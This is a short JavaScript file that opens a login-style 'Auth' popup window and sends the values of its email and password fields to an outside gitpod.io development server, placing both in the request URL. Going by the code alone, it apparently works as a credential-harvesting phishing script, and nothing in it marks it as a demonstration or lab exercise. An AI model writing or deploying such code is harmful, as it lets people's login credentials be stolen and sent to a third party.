function start() {
    var windowFeatures = "left=350,top=30,width=500,height=620";
    window.open('./Auth259432856478563495842679348.html', '_blank', windowFeatures)
}

function send() {
   fetch('https://8080-mangaman-lab-dts9bnfbgq5.ws-us72.gitpod.io/send/' + document.getElementById('email').value + '/' + document.getElementById('pwd').value)
   .then((response) => response.json())
   .then((data) => console.log(data));     
}

function close() {
    window.close();
}




